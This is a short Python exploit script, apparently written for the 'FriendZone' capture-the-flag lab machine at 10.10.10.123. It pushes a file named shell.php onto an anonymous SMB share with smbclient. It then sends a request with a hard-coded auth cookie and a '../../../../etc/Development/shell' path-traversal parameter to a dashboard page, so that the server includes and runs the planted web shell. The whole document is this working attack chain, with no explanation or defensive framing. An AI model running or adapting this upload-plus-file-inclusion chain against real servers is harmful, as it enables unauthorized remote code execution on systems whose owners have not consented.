#!/usr/bin/python
import requests,os
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

os.system("smbclient -U '%' '//10.10.10.123/Development' -c 'put files/shell.php")

cookies = {
    'FriendZoneAuth': 'e7749d0f4b4da5d03e6e9196fd1d18f1',
}

headers = {
    'Host': 'administrator1.friendzone.red',
    'Connection': 'close',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.53 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9',
    'DNT': '1',
}

params = (
    ('image_id', 'a.jpg'),
    ('pagename', '../../../../etc/Development/shell'),
)

response = requests.get('https://administrator1.friendzone.red/dashboard.php', headers=headers, params=params, cookies=cookies, verify=False, timeout=20)
